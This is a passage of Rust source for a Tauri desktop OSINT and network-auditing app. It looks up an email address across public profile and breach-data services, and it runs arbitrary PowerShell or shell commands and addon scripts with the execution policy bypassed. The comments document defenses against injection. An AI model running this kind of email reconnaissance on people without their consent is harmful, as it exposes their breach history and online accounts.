    if resp.status() == reqwest::StatusCode::NOT_FOUND {
        return EmailSourceResult::not_found("emailrep");
    }
    if !resp.status().is_success() {
        return EmailSourceResult::error("emailrep", format!("HTTP {}", resp.status()));
    }

    let body = match resp.json::<EmailRepResponse>().await {
        Ok(b) => b,
        Err(e) => return EmailSourceResult::error("emailrep", format!("bad response: {}", e)),
    };

    let profiles = body
        .details
        .as_ref()
        .and_then(|d| d.profiles.clone())
        .unwrap_or_default();
    let deliverable = body.details.as_ref().map(|d| d.deliverable).unwrap_or(false);
    let last_seen = body
        .details
        .as_ref()
        .and_then(|d| d.last_seen.clone())
        .unwrap_or_default();

    if !profiles.is_empty() || deliverable || (!last_seen.is_empty() && last_seen != "never") {
        let summary = if profiles.is_empty() {
            "deliverable, no public profiles listed".to_string()
        } else {
            format!("seen on: {}", profiles.join(", "))
        };
        EmailSourceResult {
            source: "emailrep".into(),
            status: EmailSourceStatus::Found,
            summary,
            detail: body.reputation.map(|r| format!("reputation: {}", r)),
        }
    } else {
        EmailSourceResult::not_found("emailrep")
    }
}

async fn probe_gravatar(client: &reqwest::Client, email: &str) -> EmailSourceResult {
    #[derive(Deserialize)]
    struct GravatarEntry {
        #[serde(rename = "displayName")]
        display_name: Option<String>,
        #[serde(rename = "profileUrl")]
        profile_url: Option<String>,
    }
    #[derive(Deserialize)]
    struct GravatarResponse {
        entry: Vec<GravatarEntry>,
    }

    let hash = md5_hex(&email.trim().to_lowercase());
    let url = format!("https://www.gravatar.com/{}.json", hash);
    let resp = match client
        .get(&url)
        .header("User-Agent", "OSINTNETAuditor")
        .send()
        .await
    {
        Ok(r) => r,
        Err(e) => return EmailSourceResult::error("gravatar", e.to_string()),
    };

    if resp.status() == reqwest::StatusCode::NOT_FOUND {
        return EmailSourceResult::not_found("gravatar");
    }
    if !resp.status().is_success() {
        return EmailSourceResult::error("gravatar", format!("HTTP {}", resp.status()));
    }

    match resp.json::<GravatarResponse>().await {
        Ok(body) if !body.entry.is_empty() => {
            let e = &body.entry[0];
            EmailSourceResult {
                source: "gravatar".into(),
                status: EmailSourceStatus::Found,
                summary: e
                    .display_name
                    .clone()
                    .unwrap_or_else(|| "Gravatar profile found".into()),
                detail: e.profile_url.clone(),
            }
        }
        Ok(_) => EmailSourceResult::not_found("gravatar"),
        Err(e) => EmailSourceResult::error("gravatar", format!("bad response: {}", e)),
    }
}

async fn probe_github(client: &reqwest::Client, email: &str) -> EmailSourceResult {
    #[derive(Deserialize)]
    struct GithubUserItem {
        login: String,
        html_url: String,
    }
    #[derive(Deserialize)]
    struct GithubSearchResponse {
        total_count: u32,
        items: Vec<GithubUserItem>,
    }

    let url = format!("https://api.github.com/search/users?q={}+in:email", email);
    let resp = match client
        .get(&url)
        .header("User-Agent", "OSINTNETAuditor")
        .header("Accept", "application/vnd.github+json")
        .send()
        .await
    {
        Ok(r) => r,
        Err(e) => return EmailSourceResult::error("github", e.to_string()),
    };

    if resp.status() == reqwest::StatusCode::FORBIDDEN {
        return EmailSourceResult::error("github", "rate limited");
    }
    if !resp.status().is_success() {
        return EmailSourceResult::error("github", format!("HTTP {}", resp.status()));
    }

    match resp.json::<GithubSearchResponse>().await {
        Ok(body) if body.total_count > 0 && !body.items.is_empty() => {
            let user = &body.items[0];
            EmailSourceResult {
                source: "github".into(),
                status: EmailSourceStatus::Found,
                summary: user.login.clone(),
                detail: Some(user.html_url.clone()),
            }
        }
        Ok(_) => EmailSourceResult::not_found("github"),
        Err(e) => EmailSourceResult::error("github", format!("bad response: {}", e)),
    }
}

async fn probe_hibp_breaches(
    client: &reqwest::Client,
    email: &str,
    api_key: &str,
) -> EmailSourceResult {
    #[derive(Deserialize)]
    #[serde(rename_all = "PascalCase")]
    struct Breach {
        name: String,
        breach_date: Option<String>,
    }

    let url = format!("https://haveibeenpwned.com/api/v3/breachedaccount/{}", email);
    let resp = match client
        .get(&url)
        .header("hibp-api-key", api_key)
        .header("User-Agent", "OSINTNETAuditor")
        .send()
        .await
    {
        Ok(r) => r,
        Err(e) => return EmailSourceResult::error("hibp_breaches", e.to_string()),
    };

    match resp.status() {
        reqwest::StatusCode::NOT_FOUND => EmailSourceResult::not_found("hibp_breaches"),
        reqwest::StatusCode::UNAUTHORIZED => {
            EmailSourceResult::error("hibp_breaches", "invalid API key")
        }
        reqwest::StatusCode::TOO_MANY_REQUESTS => {
            EmailSourceResult::error("hibp_breaches", "rate limited")
        }
        status if status.is_success() => match resp.json::<Vec<Breach>>().await {
            Ok(breaches) if !breaches.is_empty() => {
                let names: Vec<String> = breaches
                    .iter()
                    .map(|b| match &b.breach_date {
                        Some(d) => format!("{} ({})", b.name, d),
                        None => b.name.clone(),
                    })
                    .collect();
                EmailSourceResult {
                    source: "hibp_breaches".into(),
                    status: EmailSourceStatus::Found,
                    summary: format!("{} breach(es)", breaches.len()),
                    detail: Some(names.join(", ")),
                }
            }
            Ok(_) => EmailSourceResult::not_found("hibp_breaches"),
            Err(e) => EmailSourceResult::error("hibp_breaches", format!("bad response: {}", e)),
        },
        status => EmailSourceResult::error("hibp_breaches", format!("HTTP {}", status)),
    }
}

async fn probe_hibp_pastes(
    client: &reqwest::Client,
    email: &str,
    api_key: &str,
) -> EmailSourceResult {
    #[derive(Deserialize)]
    #[serde(rename_all = "PascalCase")]
    struct Paste {
        source: String,
        id: Option<String>,
    }

    let url = format!("https://haveibeenpwned.com/api/v3/pasteaccount/{}", email);
    let resp = match client
        .get(&url)
        .header("hibp-api-key", api_key)
        .header("User-Agent", "OSINTNETAuditor")
        .send()
        .await
    {
        Ok(r) => r,
        Err(e) => return EmailSourceResult::error("hibp_pastes", e.to_string()),
    };

    match resp.status() {
        reqwest::StatusCode::NOT_FOUND => EmailSourceResult::not_found("hibp_pastes"),
        reqwest::StatusCode::UNAUTHORIZED => {
            EmailSourceResult::error("hibp_pastes", "invalid API key")
        }
        reqwest::StatusCode::TOO_MANY_REQUESTS => {
            EmailSourceResult::error("hibp_pastes", "rate limited")
        }
        status if status.is_success() => match resp.json::<Vec<Paste>>().await {
            Ok(pastes) if !pastes.is_empty() => {
                let refs: Vec<String> = pastes
                    .iter()
                    .map(|p| match &p.id {
                        Some(id) => format!("{}: {}", p.source, id),
                        None => p.source.clone(),
                    })
                    .collect();
                EmailSourceResult {
                    source: "hibp_pastes".into(),
                    status: EmailSourceStatus::Found,
                    summary: format!("{} paste(s)", pastes.len()),
                    detail: Some(refs.join(", ")),
                }
            }
            Ok(_) => EmailSourceResult::not_found("hibp_pastes"),
            Err(e) => EmailSourceResult::error("hibp_pastes", format!("bad response: {}", e)),
        },
        status => EmailSourceResult::error("hibp_pastes", format!("HTTP {}", status)),
    }
}

async fn probe_xposedornot(client: &reqwest::Client, email: &str) -> EmailSourceResult {
    // Shapes differ between the "found" and "not found" cases (confirmed
    // from the official docs): {"breaches":[[...]],"status":"success"} vs
    // {"Error":"Not found","email":null} - one struct with both fields
    // optional parses either without guessing a shared shape.
    #[derive(Deserialize)]
    struct XposedOrNotResponse {
        breaches: Option<Vec<Vec<String>>>,
        #[serde(rename = "Error")]
        error: Option<String>,
    }

    let url = format!("https://api.xposedornot.com/v1/check-email/{}", email);
    let resp = match client
        .get(&url)
        .header("User-Agent", "OSINTNETAuditor")
        .send()
        .await
    {
        Ok(r) => r,
        Err(e) => return EmailSourceResult::error("xposedornot", e.to_string()),
    };

    if resp.status() == reqwest::StatusCode::TOO_MANY_REQUESTS {
        return EmailSourceResult::error("xposedornot", "rate limited");
    }
    if resp.status() == reqwest::StatusCode::NOT_FOUND {
        return EmailSourceResult::not_found("xposedornot");
    }
    if !resp.status().is_success() {
        return EmailSourceResult::error("xposedornot", format!("HTTP {}", resp.status()));
    }

    match resp.json::<XposedOrNotResponse>().await {
        Ok(body) => {
            if body.error.is_some() {
                return EmailSourceResult::not_found("xposedornot");
            }
            let names: Vec<String> = body.breaches.unwrap_or_default().into_iter().flatten().collect();
            if names.is_empty() {
                EmailSourceResult::not_found("xposedornot")
            } else {
                EmailSourceResult {
                    source: "xposedornot".into(),
                    status: EmailSourceStatus::Found,
                    summary: format!("{} breach(es)", names.len()),
                    detail: Some(names.join(", ")),
                }
            }
        }
        Err(e) => EmailSourceResult::error("xposedornot", format!("bad response: {}", e)),
    }
}

async fn probe_leakcheck(client: &reqwest::Client, email: &str) -> EmailSourceResult {
    // LeakCheck's public API's per-record field names aren't confirmed from
    // the docs (only the top-level success/result/error envelope is) -
    // `result` stays a raw serde_json::Value array rather than guessing a
    // per-record struct that might silently drop fields if wrong.
    #[derive(Deserialize)]
    struct LeakCheckResponse {
        success: bool,
        #[serde(default)]
        result: Vec<serde_json::Value>,
        error: Option<String>,
    }

    let url = format!("https://leakcheck.io/api/public?check={}", email);
    let resp = match client
        .get(&url)
        .header("User-Agent", "OSINTNETAuditor")
        .send()
        .await
    {
        Ok(r) => r,
        Err(e) => return EmailSourceResult::error("leakcheck", e.to_string()),
    };

    if resp.status() == reqwest::StatusCode::TOO_MANY_REQUESTS {
        return EmailSourceResult::error("leakcheck", "rate limited");
    }
    if !resp.status().is_success() {
        return EmailSourceResult::error("leakcheck", format!("HTTP {}", resp.status()));
    }

    match resp.json::<LeakCheckResponse>().await {
        Ok(body) => {
            if !body.success {
                // Confirmed live: an empty result comes back as
                // success:false with error:"Not found" rather than
                // success:true with an empty result array - a genuine
                // "nothing found" needs to read as NotFound, not Error.
                let message = body.error.unwrap_or_else(|| "unknown error".into());
                if message.trim().eq_ignore_ascii_case("not found") {
                    return EmailSourceResult::not_found("leakcheck");
                }
                return EmailSourceResult::error("leakcheck", message);
            }
            if body.result.is_empty() {
                EmailSourceResult::not_found("leakcheck")
            } else {
                EmailSourceResult {
                    source: "leakcheck".into(),
                    status: EmailSourceStatus::Found,
                    summary: format!("{} record(s)", body.result.len()),
                    detail: None,
                }
            }
        }
        Err(e) => EmailSourceResult::error("leakcheck", format!("bad response: {}", e)),
    }
}

#[tauri::command]
async fn email_recon_lookup(
    email: String,
    options: EmailReconOptions,
) -> Result<EmailReconResult, String> {
    let email = email.trim().to_string();
    if email.is_empty() || !email.contains('@') {
        return Err("Invalid email address".into());
    }

    let client = reqwest::Client::builder()
        .timeout(Duration::from_secs(8))
        .build()
        .map_err(|e| e.to_string())?;

    let emailrep_fut = async {
        if options.emailrep {
            probe_emailrep(&client, &email).await
        } else {
            EmailSourceResult::skipped_disabled("emailrep")
        }
    };

    let gravatar_fut = async {
        if options.gravatar {
            probe_gravatar(&client, &email).await
        } else {
            EmailSourceResult::skipped_disabled("gravatar")
        }
    };

    let github_fut = async {
        if options.github {
            probe_github(&client, &email).await
        } else {
            EmailSourceResult::skipped_disabled("github")
        }
    };

    let hibp_key = options.hibp_api_key.trim().to_string();
    let hibp_fut = async {
        let has_key = !hibp_key.is_empty();

        let breaches = if !options.hibp_breaches {
            EmailSourceResult::skipped_disabled("hibp_breaches")
        } else if !has_key {
            EmailSourceResult::skipped_no_key("hibp_breaches")
        } else {
            probe_hibp_breaches(&client, &email, &hibp_key).await
        };

        // HIBP's per-key rate limit is tight enough that firing both HIBP
        // calls fully concurrently risks a spurious 429 on the second one -
        // only stagger when the first one actually made a real request.
        if has_key && options.hibp_breaches {
            tokio::time::sleep(Duration::from_millis(1500)).await;
        }

        let pastes = if !options.hibp_pastes {
            EmailSourceResult::skipped_disabled("hibp_pastes")
        } else if !has_key {
            EmailSourceResult::skipped_no_key("hibp_pastes")
        } else {
            probe_hibp_pastes(&client, &email, &hibp_key).await
        };

        (breaches, pastes)
    };

    let xposedornot_fut = async {
        if options.xposedornot {
            probe_xposedornot(&client, &email).await
        } else {
            EmailSourceResult::skipped_disabled("xposedornot")
        }
    };

    let leakcheck_fut = async {
        if options.leakcheck {
            probe_leakcheck(&client, &email).await
        } else {
            EmailSourceResult::skipped_disabled("leakcheck")
        }
    };

    let (emailrep, gravatar, github, (hibp_breaches, hibp_pastes), xposedornot, leakcheck) = tokio::join!(
        emailrep_fut,
        gravatar_fut,
        github_fut,
        hibp_fut,
        xposedornot_fut,
        leakcheck_fut
    );

    let sources = vec![
        emailrep,
        gravatar,
        github,
        hibp_breaches,
        hibp_pastes,
        xposedornot,
        leakcheck,
    ];
    let hit_count = sources
        .iter()
        .filter(|s| s.status == EmailSourceStatus::Found)
        .count() as u32;
    let has_definitive_negative = sources
        .iter()
        .any(|s| s.status == EmailSourceStatus::NotFound);
    let exists_hint = if hit_count > 0 {
        "yes"
    } else if has_definitive_negative {
        "no"
    } else {
        "unknown"
    }
    .to_string();

    Ok(EmailReconResult {
        email,
        exists_hint,
        hit_count,
        sources,
    })
}

#[tauri::command]
fn open_browser(url: String) {
    // Open URL in system default browser (Windows). `cmd /c` re-scans its
    // whole trailing command line for shell metacharacters (&, |, >, <)
    // outside of quotes - any URL with multiple query params (an OAuth
    // authorize link, for instance) hits this, since Rust's own Command
    // arg-escaper only quotes an argument when it contains whitespace, not
    // `&`. Without the explicit quotes below, cmd.exe silently splits the
    // URL into several "commands" at each `&`, so `start` only ever
    // launches the browser with the first query param - everything after
    // the first `&` is dropped, not just mis-parsed. raw_arg() bypasses
    // Rust's own escaping so these are the literal quote characters cmd.exe
    // needs to see, protecting the `&`s inside from being re-interpreted.
    let _ = std::process::Command::new("cmd")
        .args(["/c", "start", ""])
        .raw_arg(format!("\"{}\"", url))
        .spawn();
}

// Auto-update (tauri-plugin-updater) can only silently re-run a downloaded
// NSIS installer - it has nothing to overwrite for a portable .exe launched
// from an arbitrary folder, and relaunch() afterwards would just restart the
// OLD portable copy while a second copy sits newly installed elsewhere. The
// frontend uses this to gate the native "Update & Restart" flow to real
// installer installs only, falling back to the old open-releases-page flow
// otherwise. Detection: the NSIS template's currentUser install mode
// (installer-template.nsi's INSTALLMODE) always lands at
// `%LOCALAPPDATA%\<PRODUCTNAME>\<exe>` - a portable zip, unzipped anywhere
// by the user, will not coincidentally match that exact path.
#[tauri::command]
fn is_installer_install() -> bool {
    let exe_dir = match std::env::current_exe().ok().and_then(|p| p.parent().map(|d| d.to_path_buf())) {
        Some(dir) => dir,
        None => return false,
    };
    let local_appdata = match std::env::var_os("LOCALAPPDATA") {
        Some(v) => std::path::PathBuf::from(v),
        None => return false,
    };
    exe_dir == local_appdata.join("OSINT NET Auditor")
}

// Topology's RDP checkbox - opens Windows' own Remote Desktop Connection
// client in its own OS window. Deliberately not an embedded-in-webview
// viewer (unlike the VNC preview): no mature browser-side RDP decoder
// exists the way noVNC exists for VNC, and standing up Guacamole (the
// alternative) would be a whole new server dependency - rejected this
// session for the same reason TigerVNC's manual guest-side setup was
// unsatisfying. mstsc.exe is a standard Windows binary, no extra
// capability/crate needed - same fire-and-forget shape as open_browser
// above.
#[tauri::command]
fn open_rdp(host: String) {
    let _ = std::process::Command::new("mstsc")
        .arg(format!("/v:{}", host))
        .spawn();
}

// ─── Browser tool ────────────────────────────────────────────────────────
// The CS "Browser" tab itself is a plain <iframe> now (js/new-ui/core's
// wireBrowserTool) - normal DOM content in the main webview, so it can
// never compete for the main window's own input the way a docked child
// webview (Window::add_child, the "unstable" multi-webview API) did:
// confirmed by hand, that approach blocked drag/resize/minimize on the
// whole app whenever the browser tab was open. Abandoned entirely, not
// just patched - see git history if it's ever worth revisiting.
//
// This command is only the fallback for sites that refuse to be iframed
// (X-Frame-Options/frame-ancestors) - a genuine, independent, natively
// decorated top-level window (WebviewWindowBuilder, the long-stable
// multi-*window* API, not the same thing as the abandoned approach above).
// Two separate OS windows never contend for each other's input, so this
// doesn't reintroduce the bug either.
async fn run_on_main<T, F>(app: &AppHandle, f: F) -> Result<T, String>
where
    T: Send + 'static,
    F: FnOnce(&AppHandle) -> Result<T, String> + Send + 'static,
{
    let (tx, rx) = tokio::sync::oneshot::channel::<Result<T, String>>();
    let app_for_closure = app.clone();
    app.run_on_main_thread(move || {
        let _ = tx.send(f(&app_for_closure));
    })
    .map_err(|e| e.to_string())?;
    rx.await.map_err(|e| e.to_string())?
}

const BROWSER_FALLBACK_WINDOW_LABEL: &str = "browser-fallback";

#[tauri::command]
async fn open_browser_window(app: AppHandle, url: String) -> Result<(), String> {
    run_on_main(&app, move |app| {
        let parsed = tauri::Url::parse(&url).map_err(|e| e.to_string())?;

        if let Some(existing) = app.get_webview_window(BROWSER_FALLBACK_WINDOW_LABEL) {
            let webview_ref: &tauri::Webview = existing.as_ref();
            webview_ref.navigate(parsed).map_err(|e| e.to_string())?;
            existing.set_focus().map_err(|e| e.to_string())?;
            return Ok(());
        }

        tauri::WebviewWindowBuilder::new(app, BROWSER_FALLBACK_WINDOW_LABEL, tauri::WebviewUrl::External(parsed))
            .title("OSINT NET Auditor - Browser")
            .inner_size(1100.0, 800.0)
            .build()
            .map_err(|e| e.to_string())?;
        Ok(())
    })
    .await
}

#[tauri::command]
async fn run_powershell(app: AppHandle, command: String) -> Result<PowerShellExecResult, String> {
    let cmd = command.trim().to_string();
    if cmd.is_empty() {
        return Err("Command is empty".into());
    }

    let script_base_dir = if cmd.contains("scripts\\") || cmd.contains("scripts/") {
        resolve_scripts_base_dir(&app)
    } else {
        None
    };

    let output = tokio::task::spawn_blocking(move || {
        #[cfg(target_os = "windows")]
        {
            const CREATE_NO_WINDOW: u32 = 0x08000000;
            let mut command = Command::new("powershell");
            command
                .creation_flags(CREATE_NO_WINDOW)
                .args([
                    "-NoProfile",
                    "-NonInteractive",
                    "-ExecutionPolicy",
                    "Bypass",
                    "-Command",
                    cmd.as_str(),
                ]);

            if let Some(base_dir) = script_base_dir.as_ref() {
                command.current_dir(base_dir);
            }

            command.output()
        }

        #[cfg(not(target_os = "windows"))]
        {
            let mut command = Command::new("sh");
            command.args(["-lc", cmd.as_str()]);

            if let Some(base_dir) = script_base_dir.as_ref() {
                command.current_dir(base_dir);
            }

            command.output()
        }
    })
    .await
    .map_err(|e| e.to_string())
    .and_then(|res| res.map_err(|e| e.to_string()))?;

    Ok(PowerShellExecResult {
        stdout: String::from_utf8_lossy(&output.stdout).to_string(),
        stderr: String::from_utf8_lossy(&output.stderr).to_string(),
        exit_code: output.status.code().unwrap_or(-1),
    })
}

// Addon commands (js/new-ui/core/panels-runtime.js's registerExtensionCommands)
// are the only caller of this - a manifest declares which named params its
// script expects via "params", and the UI collects those values from
// user-typed input fields at click time (js/new-ui/core/panel-content-
// runtime.js's .v1-ext-field-row inputs). Those values reach real PowerShell
// parameter binding via "-File <temp.ps1> -key value ..." rather than string
// interpolation, so a hostile value (containing ";", backticks, etc.) is
// bound as a literal argument, never re-parsed as PowerShell source code -
// unlike "-Command \"& { script }\" -key value", which (per
// about_PowerShell_exe) re-flattens every token after -Command into ONE
// string and re-parses the whole thing as source, discarding the OS-level
// argv boundaries Rust's Command::args() otherwise preserves. Does NOT
// reuse run_powershell above - that function's plain "-Command <string>"
// model has no place for separate argument values at all, and its 4 existing
// callers (console/macro/ip-library/addon "no params" commands) keep using
// it completely untouched.
const RESERVED_POWERSHELL_SWITCHES: [&str; 13] = [
    "command", "encodedcommand", "file", "executionpolicy", "noprofile",
    "noninteractive", "mta", "sta", "version", "windowstyle",
    "configurationname", "inputformat", "outputformat",
];

#[tauri::command]
async fn run_powershell_with_args(
    app: AppHandle,
    script: String,
    args: HashMap<String, String>,
    // Secrets (e.g. a remote-credential password) go here instead of in
    // `args` - `args` values are bound onto the child process's own command
    // line ("-key value"), which is visible for the process's whole
    // lifetime to any other locally-elevated process (Task Manager's
    // "Command line" column, WMI Win32_Process.CommandLine, etc). Env vars
    // set on the child via Command::envs() don't show up there. Option<T>
    // (not a plain HashMap + #[serde(default)], which tauri::command
    // doesn't support on individual parameters) so the 4 existing JS
    // callers, which omit this field entirely, still deserialize fine -
    // serde treats a missing Option field as None.
    env: Option<HashMap<String, String>>,
) -> Result<PowerShellExecResult, String> {
    let env = env.unwrap_or_default();
    let script = script.trim().to_string();
    if script.is_empty() {
        return Err("Script is empty".into());
    }

    for key in args.keys() {
        let is_valid_name = !key.is_empty()
            && key.chars().next().map_or(false, |c| c.is_ascii_alphabetic() || c == '_')
            && key.chars().all(|c| c.is_ascii_alphanumeric() || c == '_');
        if !is_valid_name {
            return Err(format!("Invalid argument name: {}", key));
        }
        if RESERVED_POWERSHELL_SWITCHES.contains(&key.to_ascii_lowercase().as_str()) {
            return Err(format!("Argument name is reserved: {}", key));
        }
    }

    let script_base_dir = if script.contains("scripts\\") || script.contains("scripts/") {
        resolve_scripts_base_dir(&app)
    } else {
        None
    };

    let temp_path = std::env::temp_dir().join(format!(
        "ipscanner_addon_{}_{}.ps1",
        std::process::id(),
        std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .map(|d| d.as_nanos())
            .unwrap_or(0)
    ));
    fs::write(&temp_path, &script).map_err(|e| format!("Failed to write temp script: {}", e))?;

    let temp_path_for_spawn = temp_path.clone();
    let run_result = tokio::task::spawn_blocking(move || {
        #[cfg(target_os = "windows")]
        {
            const CREATE_NO_WINDOW: u32 = 0x08000000;
            let mut command = Command::new("powershell");
            command
                .creation_flags(CREATE_NO_WINDOW)
                .args(["-NoProfile", "-NonInteractive", "-ExecutionPolicy", "Bypass", "-File"])
                .arg(&temp_path_for_spawn);
            for (key, value) in &args {
                command.arg(format!("-{}", key)).arg(value);
            }
            command.envs(&env);
            if let Some(base_dir) = script_base_dir.as_ref() {
                command.current_dir(base_dir);
            }
            command.output()
        }

        #[cfg(not(target_os = "windows"))]
        {
            let mut command = Command::new("pwsh");
            command
                .args(["-NoProfile", "-NonInteractive", "-ExecutionPolicy", "Bypass", "-File"])
                .arg(&temp_path_for_spawn);
            for (key, value) in &args {
                command.arg(format!("-{}", key)).arg(value);
            }
            command.envs(&env);
            if let Some(base_dir) = script_base_dir.as_ref() {
                command.current_dir(base_dir);
            }
            command.output()
        }
    })
    .await
    .map_err(|e| e.to_string())
    .and_then(|res| res.map_err(|e| e.to_string()));

    let _ = fs::remove_file(&temp_path);

    let output = run_result?;

    Ok(PowerShellExecResult {
        stdout: String::from_utf8_lossy(&output.stdout).to_string(),
        stderr: String::from_utf8_lossy(&output.stderr).to_string(),
        exit_code: output.status.code().unwrap_or(-1),
    })
}

#[derive(Serialize, Clone)]
struct ConsoleCommandOutput {
    pid: u32,
    stream: String,
    line: String,
}

#[derive(Serialize, Clone)]
struct ConsoleCommandDone {
    pid: u32,
    exit_code: i32,
}

// Backs the interactive Terminal tab (powershell-console-runtime.js) - unlike
// run_powershell above, this needs to hand back control (and the OS pid)
// BEFORE the process finishes, so a still-running command (netstat -an 5,
// ping -t, ...) can be interrupted from the UI (Ctrl+C) instead of blocking
// the whole call until it exits on its own. Output streams line-by-line as
// "console-command-output" events instead of being buffered until the end,
// so a long-running command's output actually appears as it happens.
#[tauri::command]
async fn start_console_command(app: AppHandle, command: String) -> Result<u32, String> {
    let cmd = command.trim().to_string();
    if cmd.is_empty() {
        return Err("Command is empty".into());
    }

    let mut std_command = {
        #[cfg(target_os = "windows")]
        {
            const CREATE_NO_WINDOW: u32 = 0x08000000;
            let mut c = Command::new("powershell");
            c.creation_flags(CREATE_NO_WINDOW).args([
                "-NoProfile",
                "-NonInteractive",
                "-ExecutionPolicy",
                "Bypass",
                "-Command",
                cmd.as_str(),
            ]);
            c
        }

        #[cfg(not(target_os = "windows"))]
        {
            let mut c = Command::new("sh");
            c.args(["-lc", cmd.as_str()]);
            c
        }
    };
    std_command.stdout(Stdio::piped()).stderr(Stdio::piped());

    let mut child = tokio::process::Command::from(std_command)
        .spawn()
        .map_err(|e| e.to_string())?;

    let pid = child.id().ok_or_else(|| "Failed to read process id".to_string())?;

    if let Some(stdout) = child.stdout.take() {
        let app_out = app.clone();
        tauri::async_runtime::spawn(async move {
            let mut lines = BufReader::new(stdout).lines();
            while let Ok(Some(line)) = lines.next_line().await {
                let _ = app_out.emit("console-command-output", ConsoleCommandOutput {
                    pid,
                    stream: "stdout".into(),
                    line,
                });
            }
        });
    }

    if let Some(stderr) = child.stderr.take() {
        let app_err = app.clone();
        tauri::async_runtime::spawn(async move {
            let mut lines = BufReader::new(stderr).lines();
            while let Ok(Some(line)) = lines.next_line().await {
                let _ = app_err.emit("console-command-output", ConsoleCommandOutput {
                    pid,
                    stream: "stderr".into(),
                    line,
                });
            }
        });
    }

    tauri::async_runtime::spawn(async move {
        let exit_code = match child.wait().await {
            Ok(status) => status.code().unwrap_or(-1),
            Err(_) => -1,
        };
        let _ = app.emit("console-command-done", ConsoleCommandDone { pid, exit_code });
    });

    Ok(pid)
}

// Kills the whole process tree, not just the immediate powershell.exe -
// otherwise a command it spawned in turn (netstat.exe, ping.exe, ...) would
// be left running detached, still writing to a pipe nothing reads from
// anymore. Silently succeeds if the pid is already gone (process finished on
// its own between the UI's "Stop" click and this call landing).
#[tauri::command]
async fn cancel_console_command(pid: u32) -> Result<(), String> {
    tokio::task::spawn_blocking(move || {
        #[cfg(target_os = "windows")]
        {
            const CREATE_NO_WINDOW: u32 = 0x08000000;
            let _ = Command::new("taskkill")
                .creation_flags(CREATE_NO_WINDOW)
                .args(["/PID", &pid.to_string(), "/T", "/F"])
                .output();
        }

        #[cfg(not(target_os = "windows"))]
        {
            let _ = Command::new("kill").args(["-9", &pid.to_string()]).output();
        }
    })
    .await
    .map_err(|e| e.to_string())?;

    Ok(())
}

#[derive(Serialize)]
#[serde(rename_all = "camelCase")]
struct ExtensionFolderPick {
    manifest_text: String,
    program_source: String,
}

// Mirrors the GitHub catalog's own tools/<id>.json + tools/<id>/main.js
// layout (see addon-catalog-runtime.js's fetchCatalog) so an addon folder
// copied straight out of that repo folder imports identically here - the
// single .json file directly inside the picked folder is the manifest;
// a same-named subfolder's main.js (if present) is the addon's own program.
#[tauri::command]
fn open_extension_manifest_folder_dialog() -> Result<ExtensionFolderPick, String> {
    let picked = rfd::FileDialog::new()
        .set_title("Import Extension Folder")
        .pick_folder();

    let dir = match picked {
        Some(dir) => dir,
        None => return Err("cancelled".into()),
    };

    let entries = fs::read_dir(&dir).map_err(|e| format!("Failed to read folder: {}", e))?;
    let mut manifest_path: Option<std::path::PathBuf> = None;
    for entry in entries {
        let entry = entry.map_err(|e| format!("Failed to read folder entry: {}", e))?;
        let path = entry.path();
        if path.is_file() && path.extension().and_then(|e| e.to_str()) == Some("json") {
            manifest_path = Some(path);
            break;
        }
    }

    let manifest_path = manifest_path
        .ok_or_else(|| "No .json manifest found in the selected folder".to_string())?;
    let manifest_text = fs::read_to_string(&manifest_path)
        .map_err(|e| format!("Failed to read manifest: {}", e))?;

    let base = manifest_path
        .file_stem()
        .and_then(|s| s.to_str())
        .unwrap_or("")
        .to_string();
    let program_path = dir.join(&base).join("main.js");
    let program_source = fs::read_to_string(&program_path).unwrap_or_default();

    Ok(ExtensionFolderPick { manifest_text, program_source })
}

#[derive(Serialize)]
#[serde(rename_all = "camelCase")]
struct LanguageFilePick {
    path: String,
    text: String,
}

#[tauri::command]
fn open_language_file_dialog() -> Result<LanguageFilePick, String> {
    let picked = rfd::FileDialog::new()
        .set_title("Import Language File")
        .add_filter("JSON", &["json"])
        .pick_file();

    let path = match picked {
        Some(path) => path,
        None => return Err("cancelled".into()),
    };

    let text = fs::read_to_string(&path).map_err(|e| format!("Failed to read file: {}", e))?;
    Ok(LanguageFilePick {
        path: path.display().to_string(),
        text,
    })
}

#[derive(Serialize)]
#[serde(rename_all = "camelCase")]
struct BinaryFilePick {
    filename: String,
    mime_type: String,
    data_base64: String,
}

// No mime_guess crate in this project - the web <input type=file> path gets
// File.type for free from the browser, but the native dialog here only
// hands back a path, so infer from the extension for the handful of types
// Agent Profiles' photo/file pickers actually deal with.
fn infer_mime_type(path: &Path) -> String {
    let ext = path
        .extension()
        .and_then(|e| e.to_str())
        .unwrap_or("")
        .to_lowercase();
    match ext.as_str() {
        "png" => "image/png",
        "jpg" | "jpeg" => "image/jpeg",
        "gif" => "image/gif",
        "webp" => "image/webp",
        "bmp" => "image/bmp",
        "svg" => "image/svg+xml",
        "pdf" => "application/pdf",
        "txt" => "text/plain",
        "json" => "application/json",
        "zip" => "application/zip",
        _ => "application/octet-stream",
    }
    .to_string()
}

#[tauri::command]
fn open_agent_profile_file_dialog(kind: String) -> Result<BinaryFilePick, String> {
    let mut dialog = rfd::FileDialog::new().set_title("Attach File");
    if kind == "photo" {
        dialog = dialog.add_filter("Images", &["png", "jpg", "jpeg", "gif", "webp", "bmp"]);
    }
    let picked = dialog.pick_file();

    let path = match picked {
        Some(path) => path,
        None => return Err("cancelled".into()),
    };

    let bytes = fs::read(&path).map_err(|e| format!("Failed to read file: {}", e))?;
    let filename = path
        .file_name()
        .map(|n| n.to_string_lossy().to_string())
        .unwrap_or_default();
    let mime_type = infer_mime_type(&path);

    Ok(BinaryFilePick {
        filename,
        mime_type,
        data_base64: BASE64_STANDARD.encode(bytes),
    })
}

#[derive(Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
struct ScanPortEntry {
    port: i64,
    protocol: String,
    #[serde(default = "default_open_status")]
    status: String,
    service: String,
    ping: String,
}

fn default_open_status() -> String {
    "open".into()
}

#[derive(Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
struct ScanResultRow {
    ip: String,
    ping: String,
    hostname: String,
    flag: String,
    isp: String,
    #[serde(rename = "as")]
    as_info: String,
    device_identification: String,
    // Location: city/country_code/lat/lon, gated by RS Config's dedicated
    // "Location" checkbox (independent of Country Flag, which only stores
    // the rendered emoji in `flag` above). #[serde(default)] so session
    // files saved before this feature still deserialize.
    #[serde(default)]
    city: String,
    #[serde(default)]
    country_code: String,
    #[serde(default)]
    lat: Option<f64>,
    #[serde(default)]
    lon: Option<f64>,
    status: String,
    status_class: String,
    ports: Vec<ScanPortEntry>,
}

#[derive(Serialize, Deserialize)]
